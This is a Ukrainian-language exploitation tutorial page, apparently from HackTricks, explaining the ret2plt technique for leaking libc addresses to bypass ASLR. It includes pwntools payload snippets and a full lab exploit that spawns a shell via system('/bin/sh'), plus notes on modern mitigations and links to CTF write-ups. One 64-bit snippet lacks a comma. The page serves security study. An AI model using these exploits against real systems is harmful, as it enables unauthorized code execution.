# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Метою цієї техніки буде **leak an address from a function from the PLT** щоб мати можливість обійти ASLR. Це тому, що, наприклад, якщо ви leak адресу функції `puts` з `libc`, ви зможете **вирахувати, де знаходиться база `libc`** і обчислити офсети для доступу до інших функцій, таких як **`system`**.

Це можна зробити за допомогою `pwntools` payload, наприклад ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Зверніть увагу, як **`puts`** (використовуючи адресу з PLT) викликається з адресою `puts`, розташованою в GOT (Global Offset Table). Це тому, що до моменту, коли `puts` виводить запис GOT для `puts`, цей **запис міститиме точну адресу `puts` в пам'яті**.

Також зверніть увагу, що в експлоїті використовується адреса `main`, тому коли `puts` завершить виконання, **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).

> [!CAUTION]
> Зверніть увагу, що для того, щоб це спрацювало, **binary cannot be compiled with PIE** або ви повинні **found a leak to bypass PIE** щоб знати адреси PLT, GOT і main. Інакше спочатку потрібно bypass PIE.

Ви можете знайти [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Це був фінальний exploit з того **example**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Сучасні особливості

- **`-fno-plt` builds** (поширені в сучасних дистрибутивах) замінюють `call foo@plt` на `call [foo@got]`. Якщо в бінарнику немає заглушки `foo@plt`, ви все одно можете leak розв'язану адресу за допомогою `puts(elf.got['foo'])` і потім **повернутися безпосередньо до запису GOT** (`flat(padding, elf.got['foo'])`), щоб перейти в libc після завершення lazy binding.
- **Full RELRO / `-Wl,-z,now`**: GOT доступний тільки для читання, але ret2plt все одно працює для leaks, оскільки ви лише читаєте слот GOT. Якщо символ ніколи не викликався, ваш перший ret2plt також виконає lazy binding і потім виведе розв'язаний слот.
- **ASLR + PIE**: якщо PIE увімкнено, спочатку leak покажчик коду (наприклад, збережену адресу повернення, function pointer або `.plt` entry через інший format‑string/infoleak), щоб обчислити базу PIE, потім побудуйте ret2plt-ланцюжок із адресами PLT/GOT, скорегованими відповідно до нової бази.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries є дійсними BTI landing pads (`bti c`), тому при експлуатації BTI‑увімкнених бінарників віддавайте перевагу переходу в PLT stub (або інший BTI‑позначений gadget) замість прямого переходу в libc gadget без BTI, інакше CPU згенерує `BRK`/`PAC` помилки.
- **Quick resolution helper**: якщо цільова функція ще не розв'язана і вам потрібен leak в один крок, зв'яжіть виклик PLT двічі: спочатку `elf.plt['foo']` (щоб розв'язати), потім знову `elf.plt['foo']` з адресою GOT як аргумент, щоб надрукувати тепер заповнений слот.

## Інші приклади та посилання

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, першим кроком є заповнення переповнення до байта 0x00 canary, щоб потім викликати puts і leak його. Маючи canary, створюють ROP gadget для виклику puts, щоб leak адресу puts з GOT, а потім ROP gadget для виклику `system('/bin/sh')`.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, переповнення стека в main від дочірньої функції. ROP gadget викликає puts, щоб leak адресу puts з GOT, а потім викликає one gadget.

## Посилання

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
